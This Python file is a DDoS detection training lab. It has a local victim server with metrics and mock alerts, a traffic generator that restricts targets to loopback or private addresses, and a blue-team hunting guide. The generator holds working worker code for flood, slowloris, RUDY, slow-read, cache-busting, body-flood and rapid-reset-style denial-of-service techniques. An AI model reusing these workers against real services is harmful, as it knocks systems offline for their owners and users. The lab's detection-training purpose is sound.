"""DDoS incident-response training lab.

A self-contained, harmless simulation of the *observable traces* left by a
denial-of-service attack, built so defenders can practise detecting them
(NetFlow/rate anomalies, connection-table growth, latency collapse, etc.).

Nothing here can attack anything real:
  * The victim server and the traffic generator BOTH refuse to touch any
    address other than the loopback interface (127.0.0.1). There is no option
    to point this at a remote host -- see ``assert_loopback()``.
  * "Attacker" sources are simulated with a header tag drawn from the RFC 5737
    documentation ranges (203.0.113.0/24 etc.); no packet is spoofed and no
    real source address is forged.
  * Worker count and duration are hard-capped so the exercise produces a clear,
    short-lived spike rather than an open-ended resource hog.
  * Every step appends a JSON line to ``events.jsonl`` in the lab directory,
    which acts as an answer key for the exercise.

Modes:
  serve   Run the local-only victim HTTP server (the target of the drill).
  flood   Generate simulated attack traffic against the loopback victim.
          Attack types: volumetric (HTTP request flood) and slowloris
          (slow/low-rate connection exhaustion).
  run     One-click drill: start the victim in-process, capture a baseline,
          run the flood, and print the before/after. Add --announce for a loud
          "TRAINING SIMULATION" banner.
  report  Print a timeline and metrics summary from the recorded events.
  detect  Print blue-team hunting guidance for the DoS techniques this lab
          imitates (MITRE T1498 / T1499) -- indicators, queries, mitigations.
  reset   Delete the lab directory so the exercise can be repeated cleanly.
"""

from __future__ import annotations

import argparse
import collections
import ipaddress
import json
import os
import shutil
import socket
import struct
import sys
import threading
import time
import uuid
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
from http.client import HTTPConnection
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

DEFAULT_LAB = Path.home() / "ddos_ir_lab"
DEFAULT_PORT = 8768
HOST = "127.0.0.1"  # loopback only; see assert_loopback()

# Hard safety caps. The lab is meant to show the *shape* of an attack, not to
# stress-test the host into the ground, so these bound how big it can get.
MAX_WORKERS = 256
MAX_DURATION = 300  # seconds
DEFAULT_WORKERS = 50
DEFAULT_DURATION = 60
DEFAULT_ALERT_RPS = 100  # models the point an IDS/rate monitor would fire
DEFAULT_ALERT_CONNS = 100
DEFAULT_ALERT_RESETS = 50  # aborted connections that fire the rapid-reset alert

MAX_BODY_BYTES = 64 * 1024  # reject oversized posts to the victim
SOURCE_CAP = 200_000  # bound the unique-source set so memory can't run away

RUN_ID_ENV = "DDOS_LAB_RUN_ID"
LAB_DIR_ENV = "DDOS_LAB_DIR"
PORT_ENV = "DDOS_LAB_PORT"

# RFC 5737 documentation ranges -- reserved for examples, never routed. Used
# only as a header label so the victim's metrics can show "distributed" fan-out.
DOC_NETS = ("203.0.113", "198.51.100", "192.0.2")


def timestamp() -> str:
    return datetime.now(timezone.utc).isoformat()


LOOPBACK = ("127.0.0.1", "localhost", "::1")
CGNAT = ipaddress.ip_network("100.64.0.0/10")  # RFC 6598, older Python misses it
BIND_ANY = ("0.0.0.0", "::")  # bind to all local interfaces


def assert_loopback(host: str) -> None:
    """Guarantee the lab only ever talks to itself (loopback-only default)."""
    if host not in LOOPBACK:
        raise SystemExit(
            f"refusing to use non-loopback host {host!r}; this lab is "
            "loopback-only by design and cannot target a real host"
        )


def _is_lab_ip(ip_str: str) -> bool:
    """True only for private/lab address space -- never a public host."""
    try:
        ip = ipaddress.ip_address(ip_str.split("%")[0])  # drop IPv6 scope id
    except ValueError:
        return False
    return bool(
        ip.is_loopback or ip.is_private or ip.is_link_local or (ip.version == 4 and ip in CGNAT)
    )


def assert_lab_target(host: str, allow_lan: bool) -> None:
    """Allow loopback always; with --allow-lan, allow ONLY private/lab hosts.

    This replaces "loopback only" with "your own lab network only". Every
    address the host resolves to must be private (RFC1918 / CGNAT / link-local
    / loopback / IPv6 ULA); a single public address refuses the whole run. It
    is what keeps this a lab drill against machines you control, not a tool
    that can reach the public internet.
    """
    if host in LOOPBACK:
        return
    if not allow_lan:
        raise SystemExit(
            f"refusing to use non-loopback host {host!r}; pass --allow-lan to "
            "target another machine on your private lab network"
        )
    try:
        addrs = {info[4][0] for info in socket.getaddrinfo(host, None)}
    except socket.gaierror as exc:
        raise SystemExit(f"could not resolve {host!r}: {exc}")
    for addr in sorted(addrs):
        if not _is_lab_ip(addr):
            raise SystemExit(
                f"refusing to target {host!r} -> {addr}: not a private/lab "
                "address. This lab only targets RFC1918/CGNAT/link-local/"
                "loopback networks you control, never a public host."
            )


def assert_lab_bind(host: str, allow_lan: bool) -> None:
    """Bind to loopback always; with --allow-lan, a private IP or all-interfaces."""
    if host in LOOPBACK:
        return
    if not allow_lan:
        raise SystemExit(
            f"refusing to bind non-loopback address {host!r}; pass --allow-lan "
            "to serve on your private lab network"
        )
    if host in BIND_ANY:
        return  # all interfaces on a lab box; fine on an isolated lab network
    if not _is_lab_ip(host):
        raise SystemExit(
            f"refusing to bind {host!r}: not a private/lab address. Bind to a "
            "loopback/RFC1918/link-local address or 0.0.0.0 on a lab box."
        )


def sim_source(index: int) -> str:
    """A stable, obviously-fake source label for worker ``index``."""
    net = DOC_NETS[(index // 254) % len(DOC_NETS)]
    host = (index % 254) + 1
    return f"{net}.{host}"


BANNER = r"""
+--------------------------------------------------------------+
|                                                              |
|            *** TRAINING SIMULATION -- SAFE ***               |
|                                                              |
|   This is the DDoS IR detection lab. It is NOT an attack     |
|   tool. Traffic stays on loopback by default; with           |
|   --allow-lan it may reach ONLY your private lab network     |
|   (RFC1918/CGNAT/link-local) -- never a public host. Every   |
|   step is logged to events.jsonl as an answer key.           |
|                                                              |
|   Run `python ddos_sim.py detect` to see what a defender     |
|   should hunt for.                                           |
|                                                              |
+--------------------------------------------------------------+
"""


def announce(gui: bool = False) -> None:
    """Show an unmistakable 'this is a simulation' notice before running."""
    print(BANNER)
    if gui:
        try:
            import tkinter
            from tkinter import messagebox

            root = tkinter.Tk()
            root.withdraw()
            messagebox.showinfo(
                "Training Simulation -- SAFE",
                "DDoS IR detection lab.\n\n"
                "This is a SAFE training simulation, not an attack tool. Traffic "
                "stays on 127.0.0.1 by default (or, with --allow-lan, only your "
                "private lab network) and can never reach a public host.",
            )
            root.destroy()
        except Exception as exc:  # tkinter missing / headless / display error
            print(f"(gui banner unavailable: {exc})")


def write_event(lab: Path, run_id: str, event: str, **details) -> dict:
    lab.mkdir(exist_ok=True)
    record = {
        "time_utc": timestamp(),
        "run_id": run_id,
        "event": event,
        "pid": os.getpid(),
        **details,
    }
    with (lab / "events.jsonl").open("a", encoding="utf-8") as log:
        log.write(json.dumps(record) + "\n")
    return record


# --------------------------------------------------------------------------- #
# Victim server: measures the traffic it receives so defenders have something
# to detect and so `report` can tell the story afterwards.
# --------------------------------------------------------------------------- #


class Metrics:
    """Thread-safe counters describing the load the victim is under."""

    def __init__(self) -> None:
        self.lock = threading.Lock()
        self.start = time.monotonic()
        self.total_requests = 0
        self.total_connections = 0  # separates connection-churn from keep-alive
        self.total_aborted = 0  # conns torn down before a request completed (rapid reset)
        self.total_bytes_in = 0  # inbound POST bytes -- reveals body floods
        self.buckets: dict[int, int] = collections.defaultdict(int)  # sec -> count
        self.sources: set[str] = set()
        self.urls: set[str] = set()  # distinct paths -- reveals cache-busting
        self.concurrent = 0
        self.peak_concurrent = 0
        self.peak_rps = 0
        self.latencies: collections.deque[float] = collections.deque(maxlen=5000)

    def _sec(self) -> int:
        return int(time.monotonic() - self.start)

    def on_open(self) -> None:
        with self.lock:
            self.total_connections += 1
            self.concurrent += 1
            if self.concurrent > self.peak_concurrent:
                self.peak_concurrent = self.concurrent

    def on_close(self) -> None:
        with self.lock:
            if self.concurrent > 0:
                self.concurrent -= 1

    def on_abort(self) -> None:
        """A connection was torn down before completing a request -- the trace a
        rapid-reset flood leaves (streams opened then cancelled/RST)."""
        with self.lock:
            self.total_aborted += 1

    def on_request(
        self, source: str | None, path: str = "", handling_s: float = 0.0, bytes_in: int = 0
    ) -> None:
        with self.lock:
            self.total_requests += 1
            self.total_bytes_in += bytes_in
            self.buckets[self._sec()] += 1
            if source and len(self.sources) < SOURCE_CAP:
                self.sources.add(source)
            if path and len(self.urls) < SOURCE_CAP:
                self.urls.add(path)
            self.latencies.append(handling_s)

    def _pct(self, latencies: list[float], p: float) -> float:
        if not latencies:
            return 0.0
        return latencies[min(len(latencies) - 1, int(len(latencies) * p))]

    def snapshot(self) -> dict:
        with self.lock:
            lat = sorted(self.latencies)
            return {
                "elapsed_s": round(time.monotonic() - self.start, 3),
                "total_requests": self.total_requests,
                "total_connections": self.total_connections,
                "aborted_connections": self.total_aborted,
                "total_bytes_in": self.total_bytes_in,
                "unique_sources": len(self.sources),
                "unique_urls": len(self.urls),
                "peak_rps": self.peak_rps,
                "concurrent": self.concurrent,
                "peak_concurrent": self.peak_concurrent,
                "latency_p50_ms": round(self._pct(lat, 0.50) * 1000, 3),
                "latency_p95_ms": round(self._pct(lat, 0.95) * 1000, 3),
            }


def make_handler(metrics: Metrics):
    class VictimHandler(BaseHTTPRequestHandler):
        server_version = "DDoSLabVictim/1.0"
        # HTTP/1.1 so keep-alive works: a volumetric/cachebust flood reuses one
        # connection (connections << requests) while connflood opens a fresh
        # socket per request (connections ~= requests). That contrast is the
        # detection lesson. Every response below sets Content-Length so the
        # keep-alive framing is unambiguous.
        protocol_version = "HTTP/1.1"
        timeout = 30  # so a stalled (slowloris) connection eventually frees

        # Count every TCP connection, including ones that never finish a
        # request -- that is exactly what a slow-rate attack exploits.
        def setup(self):  # noqa: N802 (http.server API)
            super().setup()
            metrics.on_open()

        def finish(self):  # noqa: N802 (http.server API)
            try:
                metrics.on_close()
            finally:
                super().finish()

        def handle(self):  # noqa: N802 (http.server API)
            # Under load, clients close mid-response (the generator drops its
            # sockets at the deadline). That is normal here; don't spew
            # broken-pipe tracebacks from worker threads.
            try:
                super().handle()
            except (ConnectionError, OSError):
                # Client vanished mid-exchange (reset / abrupt close) before the
                # request completed -- the observable trace of a rapid-reset flood.
                metrics.on_abort()

        def _source(self) -> str:
            return self.headers.get("X-Sim-Source") or self.client_address[0]

        def do_GET(self):  # noqa: N802 (http.server API)
            began = time.perf_counter()
            if self.path.startswith("/stats"):
                body = json.dumps(metrics.snapshot()).encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                return

            # /download?kb=N returns a larger body so a slow-read client has
            # something to trickle back, holding the server's send buffer.
            if self.path.startswith("/download"):
                kb = 256
                if "kb=" in self.path:
                    try:
                        kb = max(1, min(4096, int(self.path.split("kb=")[1].split("&")[0])))
                    except ValueError:
                        pass
                body = b"x" * (kb * 1024)
            else:
                # The "service" the drill is protecting: a trivial 200 OK.
                body = b"DDoS IR lab victim: OK (simulated service)\n"
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            # Record only the path (before the query) so cache-busting shows as
            # many *distinct* full paths while normal traffic collapses to few.
            metrics.on_request(self._source(), self.path, time.perf_counter() - began)

        def do_POST(self):  # noqa: N802 (http.server API)
            began = time.perf_counter()
            try:
                size = int(self.headers.get("Content-Length", "0"))
            except ValueError:
                self.send_error(400, "invalid Content-Length")
                return
            if size < 0 or size > MAX_BODY_BYTES:
                self.send_error(413, "body too large")
                return
            self.rfile.read(size)  # drain and discard
            self.send_response(204)
            self.end_headers()
            metrics.on_request(
                self._source(), self.path, time.perf_counter() - began, bytes_in=size
            )

        def log_message(self, format_string, *args):
            pass  # metrics replace per-request console spam

    return VictimHandler


def _monitor(
    metrics: Metrics,
    lab: Path,
    run_id: str,
    stop: threading.Event,
    alert_rps: int,
    alert_conns: int,
) -> None:
    """Once a second, record the just-finished window and fire mock alerts."""
    state = {"rps_alerted": False, "conn_alerted": False, "reset_alerted": False}
    while not stop.wait(1.0):
        with metrics.lock:
            sec = metrics._sec() - 1  # the most recent *complete* second
            rps = metrics.buckets.get(sec, 0)
            if rps > metrics.peak_rps:
                metrics.peak_rps = rps
            concurrent = metrics.concurrent
            aborted = metrics.total_aborted
        if rps > 0 or concurrent > 0:
            write_event(
                lab, run_id, "traffic_window", second=sec, rps=rps, concurrent=concurrent
            )
        if aborted >= DEFAULT_ALERT_RESETS and not state["reset_alerted"]:
            state["reset_alerted"] = True
            write_event(
                lab, run_id, "reset_flood_threshold_exceeded", aborted_connections=aborted,
                threshold=DEFAULT_ALERT_RESETS,
                note="an HTTP/2 rapid-reset (CVE-2023-44487) alert would fire here",
            )
        if rps >= alert_rps and not state["rps_alerted"]:
            state["rps_alerted"] = True
            write_event(
                lab, run_id, "rate_threshold_exceeded", rps=rps, threshold=alert_rps,
                note="a volumetric/HTTP-flood alert would fire here",
            )
        if concurrent >= alert_conns and not state["conn_alerted"]:
            state["conn_alerted"] = True
            write_event(
                lab, run_id, "connection_threshold_exceeded", concurrent=concurrent,
                threshold=alert_conns,
                note="a connection-exhaustion/slowloris alert would fire here",
            )


def _build_server(
    port: int, bind_host: str = HOST, allow_lan: bool = False
) -> tuple[ThreadingHTTPServer, Metrics]:
    assert_lab_bind(bind_host, allow_lan)
    metrics = Metrics()
    try:
        server = ThreadingHTTPServer((bind_host, port), make_handler(metrics))
    except OSError as exc:
        raise SystemExit(
            f"could not bind {bind_host}:{port} ({exc}); try a different --port"
        )
    server.daemon_threads = True
    return server, metrics


def serve(
    lab: Path,
    port: int,
    run_id: str,
    alert_rps: int,
    alert_conns: int,
    bind_host: str = HOST,
    allow_lan: bool = False,
) -> None:
    server, metrics = _build_server(port, bind_host, allow_lan)
    stop = threading.Event()
    monitor = threading.Thread(
        target=_monitor,
        args=(metrics, lab, run_id, stop, alert_rps, alert_conns),
        daemon=True,
    )
    monitor.start()
    scope = "loopback only" if bind_host in LOOPBACK else "private lab network"
    write_event(lab, run_id, "victim_server_started", address=f"{bind_host}:{port}")
    print(f"Victim server listening on {bind_host}:{port} ({scope}). Ctrl+C to stop.")
    print(f"Live stats: http://{bind_host}:{port}/stats")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
        server.shutdown()
        server.server_close()
        write_event(lab, run_id, "victim_server_stopped", **metrics.snapshot())


# --------------------------------------------------------------------------- #
# Traffic generator: simulated attack load, loopback only.
# --------------------------------------------------------------------------- #


def _volumetric_worker(host: str, port: int, deadline: float, source: str) -> dict:
    """Send complete GET requests as fast as possible until the deadline."""
    sent = errors = 0
    conn: HTTPConnection | None = None
    headers = {"X-Sim-Source": source, "Connection": "keep-alive"}
    while time.monotonic() < deadline:
        try:
            if conn is None:
                conn = HTTPConnection(host, port, timeout=5)
            conn.request("GET", "/", headers=headers)
            conn.getresponse().read()
            sent += 1
        except OSError:
            errors += 1
            if conn is not None:
                conn.close()
            conn = None
    if conn is not None:
        conn.close()
    return {"sent": sent, "errors": errors}


def _slowloris_worker(host: str, port: int, deadline: float, source: str) -> dict:
    """Open a connection and dribble headers, never completing the request."""
    opened = 0
    try:
        sock = socket.create_connection((host, port), timeout=5)
        opened = 1
        sock.sendall(b"GET /?sim=slowloris HTTP/1.1\r\n")
        sock.sendall(f"Host: {host}\r\n".encode())
        sock.sendall(f"X-Sim-Source: {source}\r\n".encode())
        # Deliberately never send the terminating blank line: hold the socket.
        while time.monotonic() < deadline:
            try:
                sock.sendall(f"X-Sim-Keepalive-{int(time.monotonic())}: 1\r\n".encode())
            except OSError:
                break
            time.sleep(min(5.0, max(0.1, deadline - time.monotonic())))
        sock.close()
    except OSError:
        pass
    return {"opened": opened, "errors": 0}


def _rudy_worker(host: str, port: int, deadline: float, source: str) -> dict:
    """R-U-Dead-Yet: announce a large POST body, then dribble it a byte at a
    time. Slow-rate sibling of slowloris, but on the request *body*."""
    opened = 0
    try:
        sock = socket.create_connection((host, port), timeout=5)
        opened = 1
        sock.sendall(b"POST / HTTP/1.1\r\n")
        sock.sendall(f"Host: {host}\r\n".encode())
        sock.sendall(f"X-Sim-Source: {source}\r\n".encode())
        sock.sendall(b"Content-Type: application/x-www-form-urlencoded\r\n")
        # Promise a body just under the victim's size cap so it accepts the
        # request and blocks reading it, then deliver crumbs (the RUDY hold).
        sock.sendall(b"Content-Length: 64000\r\n\r\n")
        while time.monotonic() < deadline:
            try:
                sock.sendall(b"a")  # one byte at a time; the body never completes
            except OSError:
                break
            time.sleep(min(5.0, max(0.1, deadline - time.monotonic())))
        sock.close()
    except OSError:
        pass
    return {"opened": opened, "errors": 0}


def _slowread_worker(host: str, port: int, deadline: float, source: str) -> dict:
    """Request a large response, then read it a trickle at a time with a tiny
    receive buffer -- pinning the server's send buffer (slow-read / slow-drip)."""
    opened = 0
    try:
        sock = socket.create_connection((host, port), timeout=5)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 512)
        except OSError:
            pass
        opened = 1
        sock.sendall(b"GET /download?kb=2048 HTTP/1.1\r\n")
        sock.sendall(f"Host: {host}\r\n".encode())
        sock.sendall(f"X-Sim-Source: {source}\r\n\r\n".encode())
        while time.monotonic() < deadline:
            try:
                if not sock.recv(1):  # read one byte, then idle
                    break
            except OSError:
                break
            time.sleep(min(2.0, max(0.1, deadline - time.monotonic())))
        sock.close()
    except OSError:
        pass
    return {"opened": opened, "errors": 0}


def _cachebust_worker(host: str, port: int, deadline: float, source: str) -> dict:
    """Volumetric flood where every request has a unique path/query, so a cache
    or CDN can't serve it and every hit lands on the origin."""
    sent = errors = 0
    conn: HTTPConnection | None = None
    headers = {"X-Sim-Source": source, "Connection": "keep-alive"}
    counter = 0
    while time.monotonic() < deadline:
        try:
            if conn is None:
                conn = HTTPConnection(host, port, timeout=5)
            counter += 1
            conn.request("GET", f"/asset-{counter}?cb={uuid.uuid4().hex}", headers=headers)
            conn.getresponse().read()
            sent += 1
        except OSError:
            errors += 1
            if conn is not None:
                conn.close()
            conn = None
    if conn is not None:
        conn.close()
    return {"sent": sent, "errors": errors}


def _rapidreset_worker(host: str, port: int, deadline: float, source: str) -> dict:
    """HTTP/2 rapid reset (CVE-2023-44487), modelled over HTTP/1.1.

    A real rapid-reset flood opens a stream (HEADERS) and immediately cancels it
    (RST_STREAM), over and over on one connection, so the server does the work of
    creating and tearing down streams far faster than it can complete any. We
    can't speak HTTP/2 to the stdlib victim, so we reproduce the *trace*: open a
    connection, fire a burst of request "streams" for a large body, then abort
    without reading a single response. The victim sees connections churn with
    requests initiated but almost none completed -- aborted_connections climbs.
    """
    streams = resets = errors = 0
    burst = 5
    while time.monotonic() < deadline:
        sock = None
        try:
            sock = socket.create_connection((host, port), timeout=5)
            # Best-effort: make close() send a TCP RST rather than a clean FIN,
            # mirroring RST_STREAM. The SO_LINGER struct layout differs by OS, so
            # this is wrapped -- if it's rejected we simply fall back to a close,
            # which still aborts the in-flight response the same way.
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                                struct.pack("ii", 1, 0))
            except OSError:
                pass
            req = (b"GET /download?kb=512 HTTP/1.1\r\n"
                   + f"Host: {host}\r\n".encode()
                   + f"X-Sim-Source: {source}\r\n".encode()
                   + b"Connection: keep-alive\r\n\r\n")
            for _ in range(burst):
                sock.sendall(req)  # open a stream ...
                streams += 1
            sock.close()           # ... and cancel it: never read the response
            resets += 1
        except OSError:
            errors += 1
            if sock is not None:
                try:
                    sock.close()
                except OSError:
                    pass
    return {"streams": streams, "resets": resets, "errors": errors}


def _connflood_worker(host: str, port: int, deadline: float, source: str) -> dict:
    """Open a fresh TCP connection per request and close it immediately --
    connection churn that exhausts the accept queue / ephemeral ports."""
    sent = errors = 0
    headers = {"X-Sim-Source": source, "Connection": "close"}
    while time.monotonic() < deadline:
        conn = None
        try:
            conn = HTTPConnection(host, port, timeout=5)
            conn.request("GET", "/", headers=headers)
            conn.getresponse().read()
            sent += 1
        except OSError:
            errors += 1
        finally:
            if conn is not None:
                conn.close()  # new connection every iteration -- no keep-alive
    return {"sent": sent, "errors": errors}


def _bodyflood_worker(host: str, port: int, deadline: float, source: str) -> dict:
    """Upload large POST bodies to burn inbound bandwidth and server read time."""
    sent = errors = 0
    payload = b"x" * (32 * 1024)  # 32 KB per request
    conn: HTTPConnection | None = None
    headers = {"X-Sim-Source": source, "Connection": "keep-alive",
               "Content-Type": "application/octet-stream"}
    while time.monotonic() < deadline:
        try:
            if conn is None:
                conn = HTTPConnection(host, port, timeout=5)
            conn.request("POST", "/upload", body=payload, headers=headers)
            conn.getresponse().read()
            sent += 1
        except OSError:
            errors += 1
            if conn is not None:
                conn.close()
            conn = None
    if conn is not None:
        conn.close()
    return {"sent": sent, "errors": errors}


ATTACKS = {
    "volumetric": _volumetric_worker,
    "slowloris": _slowloris_worker,
    "rudy": _rudy_worker,
    "slowread": _slowread_worker,
    "cachebust": _cachebust_worker,
    "connflood": _connflood_worker,
    "bodyflood": _bodyflood_worker,
    "rapidreset": _rapidreset_worker,
}


def flood(
    lab: Path,
    port: int,
    run_id: str,
    attack: str,
    workers: int,
    duration: int,
    target_host: str = HOST,
    allow_lan: bool = False,
) -> dict:
    assert_lab_target(target_host, allow_lan)
    workers = max(1, min(workers, MAX_WORKERS))
    duration = max(1, min(duration, MAX_DURATION))
    worker_fn = ATTACKS[attack]

    scope = "loopback only" if target_host in LOOPBACK else "private lab network"
    write_event(
        lab, run_id, "flood_started", attack=attack, workers=workers,
        duration_s=duration, target=f"{target_host}:{port}",
    )
    print(
        f"Generating SIMULATED {attack} load: {workers} workers x {duration}s "
        f"against {target_host}:{port} ({scope})."
    )

    deadline = time.monotonic() + duration
    totals: dict[str, int] = collections.defaultdict(int)
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = [
            pool.submit(worker_fn, target_host, port, deadline, sim_source(i))
            for i in range(workers)
        ]
        for f in futures:
            for key, value in f.result().items():
                totals[key] += value

    result = dict(totals)
    write_event(lab, run_id, "flood_completed", attack=attack, **result)
    print(f"Flood complete: {json.dumps(result)}")
    return result


# --------------------------------------------------------------------------- #
# One-click drill.
# --------------------------------------------------------------------------- #


def run(
    lab: Path,
    port: int,
    run_id: str,
    attack: str,
    workers: int,
    duration: int,
    alert_rps: int,
    alert_conns: int,
    show_banner: bool = False,
    gui_banner: bool = False,
) -> None:
    assert_loopback(HOST)
    if show_banner:
        announce(gui=gui_banner)
    lab.mkdir(exist_ok=True)

    server, metrics = _build_server(port)
    stop = threading.Event()
    threading.Thread(
        target=server.serve_forever, daemon=True
    ).start()
    threading.Thread(
        target=_monitor,
        args=(metrics, lab, run_id, stop, alert_rps, alert_conns),
        daemon=True,
    ).start()
    write_event(lab, run_id, "victim_server_started", address=f"{HOST}:{port}")

    time.sleep(1.5)  # let the baseline (quiet) window record
    write_event(lab, run_id, "baseline_captured", **metrics.snapshot())

    flood(lab, port, run_id, attack, workers, duration)

    time.sleep(2.0)  # let the final windows and peak settle
    final = metrics.snapshot()
    write_event(lab, run_id, "victim_metrics_final", **final)
    write_event(lab, run_id, "simulation_completed")

    stop.set()
    server.shutdown()
    server.server_close()

    print("\nPeak observed at the victim:")
    print(f"  total requests   : {final['total_requests']}")
    print(f"  total connections: {final['total_connections']}")
    print(f"  aborted conns    : {final['aborted_connections']}")
    print(f"  inbound bytes    : {final['total_bytes_in']}")
    print(f"  peak requests/sec: {final['peak_rps']}")
    print(f"  peak concurrent  : {final['peak_concurrent']}")
    print(f"  unique sources   : {final['unique_sources']}")
    print(f"  unique URLs      : {final['unique_urls']}")
    print(f"  latency p95 (ms) : {final['latency_p95_ms']}")
    print("\nRun `report` for the full timeline, `detect` for the hunting guide.")


# --------------------------------------------------------------------------- #
# Reporting.
# --------------------------------------------------------------------------- #


def load_events(lab: Path) -> list[dict]:
    path = lab / "events.jsonl"
    if not path.exists():
        return []
    events = []
    for line in path.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            events.append(json.loads(line))
        except json.JSONDecodeError:
            continue  # tolerate a rare interleaved line (shared-dir two-window mode)
    return events


def report(lab: Path) -> None:
    events = load_events(lab)
    if not events:
        print(f"no events recorded in {lab}")
        return

    print(f"Timeline ({len(events)} events from {lab / 'events.jsonl'}):\n")
    for e in events:
        run_tag = (e.get("run_id") or "")[:8]
        extra = ""
        if e["event"] == "traffic_window":
            extra = f"  rps={e.get('rps')} concurrent={e.get('concurrent')}"
        elif e["event"] in ("rate_threshold_exceeded", "connection_threshold_exceeded",
                             "reset_flood_threshold_exceeded"):
            extra = f"  !! {e.get('note', '')}"
        elif e["event"] == "flood_started":
            extra = f"  attack={e.get('attack')} workers={e.get('workers')}"
        print(f"  {e['time_utc']}  [{run_tag}] {e['event']}{extra}")

    baseline = next((e for e in events if e["event"] == "baseline_captured"), None)
    final = next(
        (e for e in reversed(events) if e["event"] in ("victim_metrics_final", "victim_server_stopped")),
        None,
    )
    windows = [e for e in events if e["event"] == "traffic_window"]
    peak_rps = max((e.get("rps", 0) for e in windows), default=0)
    peak_conc = max((e.get("concurrent", 0) for e in windows), default=0)

    print("\nAttack signature summary:")
    if baseline:
        print(f"  baseline requests/sec : {baseline.get('peak_rps', 0)} "
              f"(concurrent {baseline.get('concurrent', 0)})")
    print(f"  peak requests/sec     : {peak_rps}")
    print(f"  peak concurrent conns : {peak_conc}")
    if final:
        print(f"  total requests served : {final.get('total_requests', 0)}")
        print(f"  total connections     : {final.get('total_connections', 0)}")
        print(f"  aborted connections   : {final.get('aborted_connections', 0)}")
        print(f"  inbound bytes         : {final.get('total_bytes_in', 0)}")
        print(f"  unique sources        : {final.get('unique_sources', 0)}")
        print(f"  unique URLs           : {final.get('unique_urls', 0)}")
        print(f"  latency p50 / p95 (ms): {final.get('latency_p50_ms', 0)} / "
              f"{final.get('latency_p95_ms', 0)}")
    alerts = [e for e in events if e["event"].endswith("_threshold_exceeded")]
    print(f"  mock alerts fired     : {len(alerts)}")
    for a in alerts:
        print(f"    - {a['event']} ({a.get('note', '')})")


DETECTION_GUIDE = r"""
BLUE-TEAM HUNTING GUIDE -- denial of service (MITRE T1498 / T1499)
==================================================================
This lab imitates several DoS styles so you can practise DETECTING them. Map
each to the events the lab records (run `report`) and confirm your tooling
caught it. The metric that gives each one away differs -- that is the lesson:

  volumetric (T1499.002)  high requests/sec, MANY sources, few connections
                          (keep-alive reuse); latency climbs.
  cachebust               like volumetric but a huge count of UNIQUE URLs --
                          a cache/CDN can't absorb it, every hit hits origin.
  connflood               connections ~= requests (fresh socket each time) --
                          accept-queue / ephemeral-port exhaustion.
  bodyflood               inbound BYTES spike while request count is modest --
                          bandwidth / read-time exhaustion.
  rapidreset (T1499.002;  requests/streams INITIATED far exceed completed ones;
   CVE-2023-44487)        connections open then abort/RST almost immediately.
                          Lab metric: aborted_connections climbs while
                          total_requests stays low (work done, nothing served).
  slowloris (T1499.001)   concurrency climbs and holds; requests DON'T complete
                          (held request *headers*).
  rudy                    like slowloris but holds a POST *body* open (tiny
                          Content-Length drip); high concurrency, no completion.
  slowread                completes the request, then reads the response at a
                          trickle -- holds the server's SEND buffer open.

Which lab metric exposes each (see `report` / victim_metrics_final):
  unique_sources ....... source fan-out (volumetric, cachebust)
  unique_urls .......... cache-busting (cachebust: huge; others: tiny)
  total_connections .... connection churn (connflood: ~= requests)
  total_bytes_in ....... body floods (bodyflood: large)
  peak_concurrent ...... slow-rate holds (slowloris/rudy/slowread: high)
  aborted_connections .. rapid reset (rapidreset: high; requests never complete)
  total_requests ....... completed work (slow-rate & rapidreset: near zero)

1. RATE / VOLUME ANOMALIES
   - Baseline your normal requests/sec, connections/sec, and bandwidth, then
     alert on multiples of it. This lab's `rate_threshold_exceeded` event marks
     where a rate monitor would fire.
   - NetFlow/IPFIX: sudden rise in flows/sec or packets/sec to one dst/port.
   - KQL (Defender) for a per-host request-rate spike from web logs:
       // pseudo: aggregate your web/proxy logs
       WebRequests
       | summarize rps = count() by bin(Timestamp, 1s), DestinationIp
       | where rps > 100   // your baseline * safety factor

2. SOURCE FAN-OUT
   - Count distinct source IPs per minute per destination; a distributed flood
     shows a spike in *unique* sources. (This lab tags fake documentation IPs
     via X-Sim-Source so you can see the fan-out safely.)
   - Watch for many sources each sending a little -- classic DDoS, harder to
     rate-limit per-IP.

3. CONNECTION-TABLE / SLOWLORIS SIGNS
   - Concurrent established connections far above normal while request
     completions stay flat -> slow-rate attack. This lab's
     `connection_threshold_exceeded` event marks it.
   - Web server metrics: worker/thread pool saturated, queue depth growing,
     many connections in a half-open / reading-headers state.
   - `netstat -an | find /c "ESTABLISHED"` climbing with little throughput.

4. SERVICE-HEALTH SYMPTOMS (what users feel first)
   - Latency p95/p99 climbing, error rate rising (5xx, timeouts), throughput
     flat or dropping despite more requests -> capacity exhausted.
   - Correlate the health dip with the traffic spike in the same window.

5. PACKET-CAPTURE / FLOW VIEW (on the wire)
   Watch the *shape* of the traffic, not just the counts. Capture the victim
   port (loopback here) and open it in Wireshark:
     tcpdump -i lo -n port 8768 -w ddos.pcap   (Linux/macOS; on Windows capture
     on the Npcap loopback adapter)
   - volumetric / cachebust: Statistics > I/O Graph shows the requests/sec
     spike; Statistics > Conversations shows the source fan-out.
   - connflood: a fresh SYN per request -- many short-lived connections rather
     than keep-alive reuse.
   - slow-rate (slowloris/rudy/slowread): filter `tcp.flags.syn==1` for opens,
     then look for connections that stay ESTABLISHED with little/no data and
     never cleanly FIN -- concurrency holds while completions stay flat.
   - rapidreset: the opposite shape -- a storm of short connections that abort
     almost immediately (`tcp.flags.reset==1` spikes; over real HTTP/2 you'd see
     HEADERS quickly followed by RST_STREAM). Requests initiated per connection
     dwarf completed responses.

MITIGATIONS worth demoing alongside the hunt:
   - Rate limiting / connection limits per source (nginx limit_req/limit_conn,
     HAProxy, WAF); tighten header/read timeouts to kill slowloris holds.
   - Upstream/edge scrubbing and CDN/anycast absorption for volumetric floods.
   - Autoscaling + load shedding so the origin degrades gracefully.
   - SYN cookies and connection-tracking tuning at the network layer.
